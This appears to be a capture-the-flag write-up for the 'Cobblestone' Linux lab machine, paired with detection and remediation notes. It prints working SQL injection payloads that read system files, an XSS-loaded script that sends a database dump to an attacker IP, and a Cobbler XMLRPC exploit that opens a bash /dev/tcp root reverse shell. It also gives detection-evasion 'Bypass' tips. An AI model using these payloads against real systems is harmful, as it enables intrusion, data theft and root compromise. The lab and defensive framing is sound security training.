# Cobblestone

**Platform:** Linux: Insane

---

## Summary

Cobblestone chains together one of the densest attack sequences on the platform. A single Apache server exposes multiple virtual hosts, each contributing to the kill chain. The voting subdomain harbours a SQL injection: first boolean-based, then promoted to UNION-based: that grants MySQL FILE privilege abuse. 

That primitive is used to exfiltrate Apache configuration, PHP source code, and database credentials directly from disk, revealing a Cobbler provisioning API bound to localhost and a skin-suggestion feature whose admin-facing preview endpoint renders Twig templates server-side.

Because the preview endpoint requires admin authentication, a stored XSS payload is delivered through the suggestion queue. An admin bot processes it, and the injected JavaScript executes a cross-origin POST to the Twig preview endpoint in the admin's authenticated browser context, achieving server-side template injection. 

The SSTI payload runs `mysqldump` against the local database, base64-encodes the output, and exfiltrates it in chunks to an attacker listener: yielding a SHA-256 hash for the system user `cobble`. After cracking the hash, SSH access lands in an rbash chroot. An SSH local port-forward exposes the internal Cobbler XMLRPC API, which accepts unauthenticated connections and allows writing Cheetah autoinstall templates. A `#set` directive invokes Python's `os.system` and produces a root reverse shell when the profile autoinstall is triggered.

---

## Methodology Notes

Several approaches were pursued and abandoned before the correct path became clear. For the last week sum of hours slept is 20.

`INTO OUTFILE` was attempted against all three web roots (`/var/www/vote`, `/var/www/html`, `/var/www/deploy`) in an attempt to drop a webshell. All writes were blocked: either by directory permissions or a hardened MySQL configuration: confirming the file-write path was unavailable. Time spent here was not wasted because it forced a shift to reading rather than writing, which ultimately revealed the full source tree.

The bcrypt hashes for `admin` and `xmp` from the `users` table of the `vote` database were extracted early, but hashcat could not attack bcrypt without a GPU allocation. Cracking was abandoned. The SHA-256 hash recovered later via SSTI from the `cobblestone` database (the main application, not the vote application) cracked trivially with hashcat mode 1400.

The suggest-skin form on `cobblestone.htb` was invisible at default browser zoom. The feature was discovered only after reading `/var/www/html/suggest_skin.php` via `LOAD_FILE` and cross-referencing it with the running site at reduced browser window zoom. This is worth noting: source-first enumeration will always outperform click-through enumeration on hardened boxes.

---

## Recon

### Step 1: Port Scan | T1046

A full TCP scan with a high minimum rate establishes the attack surface. Two ports are open: SSH on 22 and HTTP on 80.

```
nmap -p- --min-rate 5000 10.129.232.170
```

**Findings:** 22/tcp OpenSSH 9.2p1 Debian, 80/tcp Apache 2.4.62. Service banner puts the OS as Debian 12. The SSH host key is ED25519, meaning password auth may still be active. The Apache server-header confirms Debian packaging.

```
nmap -p22,80 -sCV 10.129.232.170
```

**Findings:** `Service Info: Host: 127.0.0.1` - the server identifies itself as localhost, which is an early signal that virtual hosting is doing routing work.

---

### Step 2: Virtual Host Enumeration | T1595.003

The IP redirects to `cobblestone.htb`. After adding that to `/etc/hosts`, subdomain fuzzing discovers three additional virtual hosts.

```
ffuf -u http://FUZZ.cobblestone.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 404 -t 50
```

**Findings:** `mc`, `vote`, and `deploy` subdomains all respond. All four hosts are added to `/etc/hosts`. Directory enumeration is run against each:

```
gobuster dir -u http://cobblestone.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,git -t 50 --timeout 10s
```

**Findings:** `cobblestone.htb` serves a main site with a login page at `/login.php` and a Cobbler web UI alias at `/cobbler`. The `vote` subdomain serves a suggestion-voting application. The `deploy` subdomain serves a deployment interface. The `mc` subdomain redirects to the main page and is not independently interesting.

**Logs Generated:**
1. Apache access logs on all four vhosts record all GET/POST requests with source IP and User-Agent
2. DNS query logs (if present) record A-record lookups for each subdomain

**Alerts Triggered:**
1. SIEM threshold alert if ffuf's request rate exceeds baseline: 50 threads against a single host is loud
2. IDS pattern match on the `gobuster` User-Agent string

**Network Artifacts:**
1. High-rate HTTP GET flood from single source IP to the target web server
2. DNS enumeration traffic visible in resolver logs

**Artifacts Left:**
1. Source IP recorded in Apache access logs across all vhosts
2. User-Agent strings from ffuf and gobuster preserved in log lines

**Sysmon/EDR:** N/A: Linux target, no Sysmon. Auditd would log network connections if configured.

**SIEM Correlation:**
1. Correlate high request rate from single IP with 404 responses to build scanning signature
2. Alert on gobuster/ffuf User-Agent strings appearing in web access logs

**Sigma Rule:** [web_scan_gobuster](https://github.com/SigmaHQ/sigma/search?q=gobuster): community rules exist for gobuster and ffuf User-Agent detection.

**Bypass:** Rotate User-Agent strings with `--useragent`, throttle request rate with `--delay`, and distribute enumeration across multiple source IPs to avoid rate-based detection.

**Remediation:** Implement a WAF with automated rate limiting. Return identical responses for valid and invalid virtual host names to prevent subdomain enumeration from external sources.

**OpSec Rating:** Loud. ffuf at 50 threads is highly visible in any logging environment. Acceptable on HTB where stealth is not assessed, but would trigger immediate alerts in a real engagement.

---

## Exploitation

### Step 3: Boolean-Based Blind SQL Injection | T1190

The `vote.cobblestone.htb` suggestion form accepts a URL parameter that is passed directly to a SQL query. Injecting a double-quote terminates the string context and reveals error-based or boolean-based differences in response. Testing with `OR SLEEP(5)` confirms time-based injection works. Testing with character-comparison subqueries reveals a boolean channel: a true condition returns a suggestion page with content, a false condition returns the background image alone.

The database name is extracted character by character using the following pattern (eleven iterations, one per character):

```
" OR (SELECT SUBSTRING((SELECT database()),1,1))='c' --
```

**Findings:** Database name is `cobblestone`. Table enumeration follows the same pattern:

```
" OR (SELECT SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='cobblestone' LIMIT 0,1),1,1))='s' --
```

**Findings:** Two tables: `suggestions` (eleven characters) and `users` (five characters). This confirms there is a user account table worth targeting.

**Logs Generated:**
1. Apache access logs on `vote.cobblestone.htb` record each injection attempt with the full query string
2. MySQL general query log (if enabled) captures the raw injected SQL
3. MySQL slow query log captures SLEEP-based payloads if the threshold is exceeded

**Alerts Triggered:**
1. WAF or IDS SQL injection signature match on `OR SLEEP`, `SUBSTRING`, `information_schema`
2. Application-layer alert if error responses are monitored

**Network Artifacts:**
1. Repeated GET requests to the same endpoint with incrementally varying `url` parameter values
2. Timing anomalies in HTTP response times if SLEEP payloads were used

**Artifacts Left:**
1. All injection strings preserved in Apache access logs
2. If MySQL general log is on, the injected queries are fully recorded

**Sysmon/EDR:** N/A: Linux target.

**SIEM Correlation:**
1. Alert on `information_schema` appearing in HTTP request parameters
2. Correlate response-time variance from a single IP against the same endpoint

**Sigma Rule:** [sql_injection_detection](https://github.com/SigmaHQ/sigma/search?q=sql+injection): generic web application SQL injection rules exist targeting `information_schema`, `UNION`, and `SLEEP` in URI parameters.

**Bypass:** Encode injection strings using URL encoding or comment obfuscation (`/**/` instead of spaces). Use time-based inference with randomised sleep intervals to blend timing anomalies with normal latency. Avoid `information_schema` by targeting `mysql.innodb_table_stats` or `performance_schema` on MySQL 5.7+.

**Remediation:** Use parameterised queries throughout the voting application. Disable the MySQL general query log in production. Deploy a WAF with SQL injection ruleset covering blind injection patterns.

---

### Step 4: UNION-Based SQLi and MySQL FILE Privilege Abuse | T1190, T1005

Once the injection type and column count (five columns) are confirmed, a UNION-based payload is used to check the privileges granted to the database session user.

```
url=-9999' UNION ALL SELECT 1,2,3,(SELECT GROUP_CONCAT(grantee,':',privilege_type SEPARATOR '; ') FROM information_schema.user_privileges),5-- -
```

**Findings:** `'voteuser'@'localhost':FILE` - the MySQL session user holds the FILE privilege, meaning `LOAD_FILE()` can read files that the MySQL process has read access to, and `INTO OUTFILE` can attempt writes (subject to filesystem permissions and `secure_file_priv`).

```
url=-9999' UNION ALL SELECT 1,2,3,(SELECT GROUP_CONCAT(variable_name,':',variable_value SEPARATOR '; ') FROM information_schema.global_variables WHERE variable_name='secure_file_priv'),5-- -
```

**Findings:** `SECURE_FILE_PRIV` is empty, meaning no directory restriction is enforced on file reads. `LOAD_FILE` has unrestricted path access (subject to OS-level permissions).

The following files are read systematically:

```
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/etc/passwd'),5-- -
```

**Findings:** System users include `cobble` (uid 1000, shell `/bin/rbash`) and `john` (uid 1001, shell `/bin/bash`). The rbash shell for `cobble` is noted: it signals a restricted environment on login.

```
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/etc/apache2/sites-enabled/000-default.conf'),5-- -
```

**Findings:** The default vhost configuration reveals a ProxyPass directive forwarding `/cobbler_api` to `http://127.0.0.1:25151/`. This is an internal Cobbler provisioning API, not reachable from outside. Document roots are `/var/www/html`, `/var/www/vote`, and `/var/www/deploy`.

```
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/etc/ssh/sshd_config'),5-- -
```

**Findings:** A `Match User cobble` block sets `ChrootDirectory /home/chroot_jail` and disables X11 forwarding, confirming that any SSH session as `cobble` will land in a restricted chroot.

```
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/var/www/html/skins.php'),5-- -
```

**Findings:** Source includes `db/connection.php` and `vendor/autoload.php`. Reading the connection file:

```
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/var/www/html/db/connection.php'),5-- -
```

**Findings:** Database credentials: `dbuser` / `aichooDeeYanaekungei9rogi0eMuo2o`, connecting to database `cobblestone` on localhost.

```
url=-9999' UNION ALL SELECT 1,2,3,LOAD_FILE('/var/www/html/suggest_skin.php'),5-- -
```

**Findings:** A skin-suggestion feature exists on the main site. The source references `preview_banner.php` - a separate endpoint that accepts POST data and renders it through a Twig template engine. This endpoint exists only on the admin side, but the XSS vector available through the suggestion queue provides a path to trigger it in an authenticated admin context.

**Logs Generated:**
1. Apache access logs record all UNION payloads in the `url` parameter
2. MySQL general query log captures all `LOAD_FILE` calls with full paths if enabled

**Alerts Triggered:**
1. WAF rule match on `LOAD_FILE`, `UNION ALL SELECT`, and `information_schema.global_variables` in request parameters
2. DLP alert if file-read patterns are monitored at the application layer

**Network Artifacts:**
1. HTTP GET requests to `vote.cobblestone.htb` with long, structured `url` parameter values
2. Response body size anomalies: successful `LOAD_FILE` calls return file contents embedded in the page

**Artifacts Left:**
1. All payloads recorded in Apache access logs: `LOAD_FILE('/etc/passwd')` is a clear indicator of compromise
2. File path strings in MySQL query logs if general logging is active

**Sysmon/EDR:** N/A: Linux target.

**SIEM Correlation:**
1. Alert on `LOAD_FILE` appearing in HTTP GET parameters: this is almost never legitimate
2. Correlate large response bodies from a single endpoint with SQL injection signatures in the same session

**Sigma Rule:** No dedicated SigmaHQ rule targets `LOAD_FILE` in URI parameters specifically. Generic SQL injection rules at [web_application_sql_injection](https://github.com/SigmaHQ/sigma/search?q=sql+injection+web) cover the broader pattern.

**Bypass:** The `LOAD_FILE` payload can be hex-encoded or passed through MySQL string functions to evade signature matching on the literal `LOAD_FILE` string. Response body exfiltration can be broken across multiple requests using `SUBSTRING` to avoid size-based anomaly detection.

**Remediation:** Revoke the FILE privilege from all application database users: it should never be granted to web application accounts. Enable `secure_file_priv` to restrict MySQL file access to a controlled directory. Rotate the `db/connection.php` credentials immediately.

---

### Step 5: Stored XSS to Twig SSTI via Admin Preview Endpoint | T1059.007, T1190

The skin-suggestion feature on `cobblestone.htb` allows arbitrary HTML input in the suggestion body. The `preview_banner.php` endpoint processes the `first` POST parameter through Twig and returns rendered output. Because this endpoint requires an active admin session, direct access from the attacker machine is blocked. The XSS vector in the suggestion queue provides a channel to execute JavaScript in the admin's authenticated browser, which can then make authenticated POST requests to `preview_banner.php` on behalf of the admin.

A malicious skin suggestion is submitted containing an XSS payload that loads a remote JavaScript file:

```
<img src=x onerror="var s=document.createElement('script');s.src='http://10.10.16.150:8081/x.js';document.body.appendChild(s)">
```

The JavaScript file served by the attacker constructs a Twig SSTI payload: the `|map('system')` filter chain: wrapping a `mysqldump` command that targets the `cobblestone` database using the previously discovered credentials. Output is base64-encoded and exfiltrated in 800-character chunks:

```javascript
// x.js
(async () => {
  const B = 'http://cobblestone.htb/preview_banner.php';
  const H = 'http://10.10.16.150:4444';
  const cmd = "mysqldump -h127.0.0.1 -udbuser -paichooDeeYanaekungei9rogi0eMuo2o cobblestone users";
  let r = await fetch(B, {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'first='+encodeURIComponent("{{['"+cmd+"']|map('system')|join}}")});
  let t = await r.text();
  const clean = btoa(unescape(encodeURIComponent(t)));
  for(let i=0; i*800 < clean.length; i++){
    await fetch(H+'/?i='+i+'&r='+clean.substr(i*800, 800));
  }
})();
```

The attacker serves the script on port 8081 and receives exfiltrated chunks on port 4444:

```
python3 -m http.server 8081
```

```
python3 -m http.server 4444
```

When the admin bot reviews the suggestion and the XSS fires, `preview_banner.php` executes `mysqldump` server-side as the web process user. The output arrives at the attacker's listener in base64 chunks.

**Findings:** The `cobblestone` database `users` table contains the following credential row for `cobble`:

```
(2,'cobble','cobble','stone','cobble@cobblestone.htb','admin','20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d','*')
```

The hash is SHA-256 (not bcrypt). Cracking:

```
echo '20cdc5073e9e7a7631e9d35b5e1282a4fe6a8049e8a84c82987473321b0a8f4d' > cobble.hash
```

```
hashcat -m 1400 cobble.hash /usr/share/wordlists/rockyou.txt
```

**Findings:** Hash cracks successfully, yielding `cobble`'s plaintext password.

**Logs Generated:**
1. Apache access log on `vote.cobblestone.htb` records the XSS suggestion submission
2. Apache access log on `cobblestone.htb` records the admin bot's page load of the suggestion, revealing the bot's source IP or User-Agent
3. Apache access log on `cobblestone.htb` records the POST request to `preview_banner.php` from the admin session
4. Web server access log records the JavaScript fetch to the attacker's IP for `x.js`
5. Attacker's HTTP server receives exfiltrated chunks: these are outbound GET requests from the victim server

**Alerts Triggered:**
1. Content Security Policy violation (if CSP is configured) when `img` onerror fires and loads an external script
2. SIEM alert on outbound HTTP GET requests from the web server to an external attacker IP: servers should not be initiating outbound HTTP to arbitrary external addresses
3. Twig SSTI pattern `|map('system')` in POST body may match WAF SSTI signatures

**Network Artifacts:**
1. Outbound HTTP GET from the server to `10.10.16.150:8081` for `x.js` - this is a critical anomaly
2. Outbound HTTP GET requests from the server to `10.10.16.150:4444` containing base64 data: clear data exfiltration
3. POST to `preview_banner.php` containing `map('system')` in the body

**Artifacts Left:**
1. XSS payload preserved in the skin suggestion database record
2. POST body containing Twig SSTI payload recorded in Apache access logs if body logging is enabled
3. `mysqldump` process spawned by Apache's child process: visible in process accounting logs or auditd

**Sysmon/EDR:** N/A: Linux. Auditd `execve` syscall logging would capture the `mysqldump` invocation with its full argument list including the plaintext password. `/var/log/laurel` (present per `/etc/passwd`) is a structured auditd log processor: high probability this exeuction was logged.

**SIEM Correlation:**
1. Alert on `execve` of `mysqldump` by the Apache process user (www-data): web processes should not be spawning database utilities
2. Correlate outbound HTTP connections originating from the web server process with user-controlled input in preceding requests
3. Alert on POST bodies containing Twig/PHP template injection signatures (`|map`, `__class__`, `system`)

**Sigma Rule:** [ssti_detection_web](https://github.com/SigmaHQ/sigma/search?q=server+side+template+injection): SSTI rules exist in SigmaHQ targeting template engine payloads in web request bodies. Process execution rules for web-server-spawned shells are at [webshell_detection](https://github.com/SigmaHQ/sigma/search?q=webshell).

**Bypass:** Host `x.js` on a CDN or trusted domain to bypass domain-reputation filtering. Break the Twig payload across concatenated strings to evade WAF signature matching. Use DNS exfiltration instead of HTTP to bypass outbound HTTP monitoring.

**Remediation:** Implement a strict Content Security Policy on all pages that render user input. Disable Twig's `system`-callable filters or run Twig in sandbox mode. The `preview_banner.php` endpoint should validate and sanitise template input server-side regardless of the authentication state of the caller. Enable auditd `execve` monitoring to detect process spawning by web server processes.

---

### Step 6: SSH Access as cobble | T1078

With the cracked password, SSH access is obtained:

```
ssh cobble@cobblestone.htb
```

**Findings:** The session lands in an rbash chroot at `/home/chroot_jail`. Binary execution is restricted. Standard shell escapes (Python, Perl, awk) are unavailable within the jail. The session is usable only for port forwarding: SSH itself is not restricted to the chroot for tunnelling operations.

**Logs Generated:**
1. SSH authentication success event in `/var/log/auth.log` - `Accepted password for cobble from <attacker IP>`
2. PAM session open event logged

**Alerts Triggered:**
1. Alert on SSH login from a new or unexpected source IP
2. Brute-force detection if multiple failed attempts preceded the successful login

**Network Artifacts:**
1. TCP connection to port 22 from attacker IP
2. SSH handshake and authentication sequence

**Artifacts Left:**
1. Login recorded in `/var/log/auth.log` with timestamp and source IP
2. Session potentially recorded by the `_laurel` auditd processor visible in `/etc/passwd`

**Sysmon/EDR:** N/A: Linux. Auditd USER_AUTH and USER_LOGIN records if configured.

**SIEM Correlation:**
1. Alert on SSH logins from external IPs during off-hours
2. Correlate successful SSH login with preceding web application compromise indicators in the same session timeline

**Sigma Rule:** [ssh_login_new_source](https://github.com/SigmaHQ/sigma/search?q=ssh+login): rules exist for first-seen SSH source IP and failed-then-success authentication sequences.

**Bypass:** SSH over a proxy or through a previously compromised hop to obscure the true source IP.

**Remediation:** Disable password authentication for SSH: enforce key-based authentication only. Restrict `cobble`'s SSH access to localhost-only connections if the account is only needed for the chroot environment. Rotate the compromised password immediately.

---

### Step 7: SSH Local Port Forward to Expose Internal Cobbler API | T1572

The Apache configuration read via `LOAD_FILE` revealed a Cobbler XMLRPC API bound to `127.0.0.1:25151`. It is not directly reachable from outside but is reachable through the SSH session. An SSH local port forward maps the attacker's local port 25151 to the internal service:

```
ssh -N -L 25151:127.0.0.1:25151 cobble@cobblestone.htb
```

**Findings:** Port 25151 on `localhost` (attacker machine) now proxies to the Cobbler XMLRPC API. The API is reachable at `http://127.0.0.1:25151`.

**Logs Generated:**
1. SSH session with port-forward flag recorded in auth.log
2. If network flow monitoring is in place, the tunnel creates a persistent TCP connection on port 22 carrying internal service traffic

**Alerts Triggered:**
1. Anomaly-based alert on long-lived SSH sessions with no shell activity (the `-N` flag means no shell is opened)
2. Alert if Cobbler API receives connection attempts from an unexpected source (forwarded traffic appears to originate from localhost)

**Network Artifacts:**
1. Persistent TCP connection on port 22 with no corresponding shell session (port-forward-only pattern)

**Artifacts Left:**
1. SSH session logged; the `-N` flag session may appear distinct from normal interactive sessions in audit logs

**Sysmon/EDR:** N/A: Linux.

**SIEM Correlation:**
1. Correlate long-lived non-interactive SSH sessions with subsequent internal service access patterns
2. Alert on Cobbler API access from localhost when no local administrative activity is expected

**Sigma Rule:** No specific SigmaHQ rule targets SSH port-forwarding sessions. Network-layer rules detecting non-interactive SSH sessions may partially cover this.

**Bypass:** Protocol tunnelling over DNS or ICMP if SSH-based tunnels are filtered. Use SOCKS proxying (`ssh -D`) rather than a fixed local forward to blend traffic patterns.

**Remediation:** Disable SSH port forwarding for the `cobble` user in `sshd_config` (`AllowTcpForwarding no`). Restrict the Cobbler API to connections from specific administrative IPs only, even on localhost.

---

### Step 8: Cobbler XMLRPC Authentication Bypass and Cheetah Template SSTI to Root | T1068

Cobbler exposes an unauthenticated XMLRPC surface. Passing an empty string as the username and `-1` as the password triggers a code path that returns a valid session token without verifying credentials. This is a documented authentication weakness in Cobbler's XMLRPC layer when accessed from localhost.

Cobbler's autoinstall template system uses the Cheetah template engine. Templates are processed server-side when a profile's autoinstall is generated. The Cheetah `#set` directive can invoke arbitrary Python: including `__import__('os').system()` - meaning any user who can write an autoinstall template and trigger profile generation has unauthenticated remote code execution as the process owner (root, in Cobbler's case).

A netcat listener is opened on the attacker machine:

```
nc -lvnp 9001
```

The following Python script connects to the Cobbler API, authenticates with the bypass, writes a malicious Cheetah template, creates a dummy distro and profile referencing that template, and triggers profile autoinstall generation to execute the payload:

```python
# exploit.py
import xmlrpc.client

LHOST = "10.10.16.150"
LPORT = "9001"

payload = f"""#set $null = __import__('os').system('bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"')
lang en_US
keyboard us
network --bootproto=dhcp
rootpw --plaintext cobbler
timezone UTC
bootloader --location=mbr
clearpart --all --initlabel
autopart
reboot
"""

s = xmlrpc.client.ServerProxy("http://127.0.0.1:25151")
t = s.login("", -1)
print("Token:", t)

s.write_autoinstall_template("pwn.ks", payload, t)
print("Template written")

did = s.new_distro(t)
s.modify_distro(did, "name", "pwndistro", t)
s.modify_distro(did, "arch", "x86_64", t)
s.modify_distro(did, "breed", "redhat", t)
s.modify_distro(did, "kernel", "/boot/vmlinuz-6.1.0-37-amd64", t)
s.modify_distro(did, "initrd", "/boot/initrd.img-6.1.0-37-amd64", t)
s.save_distro(did, t)
print("Distro created")

pid = s.new_profile(t)
s.modify_profile(pid, "name", "pwnprofile", t)
s.modify_profile(pid, "distro", "pwndistro", t)
s.modify_profile(pid, "autoinstall", "pwn.ks", t)
s.save_profile(pid, t)
print("Profile created")

print("Triggering RCE...")
try:
    print(s.generate_profile_autoinstall("pwnprofile"))
except Exception as e:
    print("Exception (shell may have connected):", e)
```

```
python3 exploit.py
```

**Findings:** A root reverse shell connects to the listener. `id` returns `uid=0(root)`.

**Logs Generated:**
1. Cobbler daemon logs XMLRPC calls: the `login`, `write_autoinstall_template`, `new_distro`, `new_profile`, and `generate_profile_autoinstall` calls will all appear
2. Auditd `execve` records the `bash` invocation spawned by Cobbler as root
3. Network connection from the server to `10.10.16.150:9001` logged in firewall or flow records

**Alerts Triggered:**
1. Alert on outbound TCP connection from the server on a non-standard port (9001) to an external IP: a root process initiating an outbound shell is a critical indicator
2. Cobbler audit log showing template creation followed immediately by `generate_profile_autoinstall` with no corresponding administrator session

**Network Artifacts:**
1. TCP connection from server to `10.10.16.150:9001` - reverse shell traffic
2. XMLRPC traffic on the forwarded port 25151 (appears as localhost traffic on the server)

**Artifacts Left:**
1. Malicious autoinstall template `pwn.ks` written to Cobbler's template directory on disk
2. Distro `pwndistro` and profile `pwnprofile` persisted in Cobbler's object store
3. Auditd records of the root shell invocation
4. Cobbler daemon log with full XMLRPC call history

**Sysmon/EDR:** N/A: Linux. Auditd `execve` and `connect` syscall rules targeting the Cobbler daemon process would capture this precisely.

**SIEM Correlation:**
1. Critical alert: outbound TCP connection from Cobbler daemon process to an external IP on a non-standard port
2. Correlate Cobbler XMLRPC `write_autoinstall_template` calls with subsequent `generate_profile_autoinstall` calls inside the same session token: this sequence has no legitimate administrative use case that produces an outbound shell

**Sigma Rule:** No dedicated SigmaHQ Cobbler rule exists. [process_creation_suspicious_network_connection](https://github.com/SigmaHQ/sigma/search?q=reverse+shell+bash): rules detecting bash reverse shell patterns (`/dev/tcp`) via process argument monitoring apply. Auditd `execve` rules for `/dev/tcp` usage are the most targeted detection here.

**Bypass:** Encode the reverse shell payload to avoid `/dev/tcp` pattern matching: use `python3 -c` socket-based shell or `socat` if available. Write the template under a name that resembles legitimate Cobbler templates to blend into the template directory listing.

**Remediation:** Cobbler should require authentication for all XMLRPC operations even from localhost: the unauthenticated session token bypass must be patched or the API bound behind an authentication proxy. Cobbler should not run as root; a dedicated low-privilege service account with limited filesystem access is the correct deployment. Disable the `generate_profile_autoinstall` endpoint if dynamic template rendering is not required. Implement outbound firewall rules blocking unexpected TCP connections from the Cobbler service process.

---

## Detection Map

| Step | Technique | MITRE ID | Detectability |
|---|---|---|---|
| Port scan | Network Service Scanning | T1046 | Medium: rate-based IDS |
| Subdomain fuzzing | Wordlist Scanning | T1595.003 | High: User-Agent + rate |
| Boolean blind SQLi | Exploit Public-Facing App | T1190 | Medium: WAF pattern match |
| UNION SQLi + LOAD_FILE | Exploit Public-Facing App + Data from Local System | T1190, T1005 | High: LOAD_FILE in URI is unambiguous |
| Credential discovery in source | Unsecured Credentials in Files | T1552.001 | Low: passive read, no process |
| Stored XSS delivery | JavaScript Execution | T1059.007 | Medium: CSP absence required |
| Twig SSTI via admin session | Exploit Public-Facing App | T1190 | High: outbound HTTP from server |
| Hash cracking | Brute Force: Password Cracking | T1110.002 | None: fully offline |
| SSH login as cobble | Valid Accounts | T1078 | Medium: new source IP |
| SSH port forward | Protocol Tunneling | T1572 | Low: non-interactive SSH session |
| Cobbler auth bypass + SSTI | Exploitation for Privilege Escalation | T1068 | Critical: root outbound shell |

---

## Would I Get Caught

On a real engagement, this attack chain would generate several high-confidence indicators, but they cluster around two moments where detection is near-certain rather than distributed evenly across the kill chain.

The early enumeration phase: nmap, ffuf, gobuster: is loud but rarely acted upon immediately in most enterprise environments unless automated blocking is in place. The SQL injection phase is where a mature blue team would first get a clear picture: `LOAD_FILE('/etc/passwd')` appearing in a web request parameter is not ambiguous. No legitimate application sends that string to a backend. If the WAF is logging and alerting, the intrusion is flagged at Step 4 before any credentials are obtained.

The XSS-to-SSTI phase is the most technically sophisticated step, but also the most visible in retrospect: a web server initiating an outbound HTTP GET to an attacker-controlled IP is an anomaly in any environment with egress monitoring. The `/var/log/laurel` entry in `/etc/passwd` confirms that structured audit logging is active on this machine. If the auditd `execve` rule covers the `mysqldump` invocation by the Apache process, this step is logged in full: including the database password passed as a command-line argument.

The Cobbler exploitation is where even a partially-instrumented environment would fire a critical alert. An outbound TCP connection from a provisioning daemon to an external IP on port 9001 is the textbook signature of a reverse shell. Any NGFWwith default policies blocks this. In a network with strict egress filtering, the reverse shell would fail and an alternative exfiltration channel (DNS, ICMP) would be required.

The primary failure mode for this defence is the absence of egress filtering and the absence of auditd `execve` coverage for web server process children. Both are surprisingly common gaps. In an environment that has only perimeter-facing detection and no internal host telemetry, this attack chain completes undetected.
